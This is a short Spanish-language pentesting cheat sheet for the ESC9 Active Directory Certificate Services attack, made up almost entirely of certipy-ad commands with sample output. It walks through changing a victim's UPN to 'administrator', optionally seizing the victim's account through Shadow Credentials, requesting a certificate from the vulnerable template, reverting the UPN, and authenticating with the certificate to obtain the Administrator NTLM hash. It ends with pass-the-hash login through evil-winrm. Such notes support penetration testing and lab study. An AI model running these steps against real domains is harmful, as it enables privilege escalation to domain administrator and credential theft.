ESC9

ESC9 está relacionado con plantillas sin security extension y escenarios donde se puede mapear el certificado hacia otra identidad.

No Security Extension on Certificate Template

ESC9 PoC

Opcional: Leer UPN de la víctima

certipy-ad account -u '<attacker>@<domain>' -p '<pass>' -dc-ip '<dc_ip>' -user '<victim>'  read
# [*] Reading attributes for 'victim':
# cn                 : Victim
# userPrincipalName  : victim@CORP.LOCAL

1. Agregar a la víctima al UPN del Administrador

certipy-ad account -u '<attacker>@<domain>' -p '<pass>' -dc-ip '<dc_ip>' -upn 'administrator' -user '<victim>' update

(En caso de NO tener credenciales de la víctima) Obtener credenciales via Shadow Credentials

certipy-ad shadow -u '<attacker>@<domain>' -p '<pass>' -dc-ip '<dc_ip>' -account '<victim>' auto
# Obtenemos hash_NT de la víctima
# Obtenemos victim.ccache
export KRB5CCNAME=victim.ccache

2. Solicitar certificado .pfx para la víctima con la plantilla vulnerable

# Solicitar con credenciales de victim
certipy-ad req -u '<victim>' -hashes '<hash_NT_victim>' -dc-ip '<dc_ip>' -target '<hostname>.<domain>' -ca '<ca_name>' -template <'template_name'>
# Solicitar con kerberos KRB5CCNAME y la flag -k 
certipy-ad req -k -dc-ip '<dc_ip>' -target '<hostname>.<domain>' -ca '<ca_name>' -template '<template_name>'
# Obtenemos administrator.pfx

3. Revertir el UPN de la víctima

certipy-ad account  -u "<attacker>@<domain>" -p "<pass>" -user '<victim>' -upn '<victim>@<domain>' update

4. Autenticarnos como administrator para conseguir su hash NTLM

certipy-ad auth -pfx administrator.pfx -domain '<domain>' -dc-ip '<dc_ip>'
# Obtenemos hash_NTLM de Administrator

Acceso WINRM

evil-winrm -u 'Administrator' -H '<hash_NT>' -i '<ip_dc>'
